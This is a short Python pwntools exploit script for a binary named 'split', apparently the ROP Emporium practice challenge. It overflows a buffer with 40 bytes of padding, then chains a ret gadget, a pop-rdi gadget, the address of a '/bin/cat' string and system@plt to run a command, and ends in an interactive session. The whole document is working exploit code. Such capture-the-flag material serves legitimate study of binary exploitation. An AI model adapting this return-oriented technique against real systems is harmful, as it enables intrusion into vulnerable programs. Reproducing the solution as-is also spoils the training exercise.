from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "split"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


context.binary = e


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    elif(sys.argv[1] == "gdb"):
        p = gdb.debug(f"./{binary_name}", gdbscript="b *system", aslr=False)
    else:
        p = process(f"./{binary_name}")

    Sys_PLT=e.plt['system']
    log.success(f"system at {hex(Sys_PLT)}")
    ret = p64(0x40053e)
    bin_cat = p64(0x601060)
    pop_rdi = p64(0x4007c3)
    payload = b"A" *40 + ret+ pop_rdi + bin_cat + p64(Sys_PLT)
    p.sendline(payload)
    p.interactive()
main()
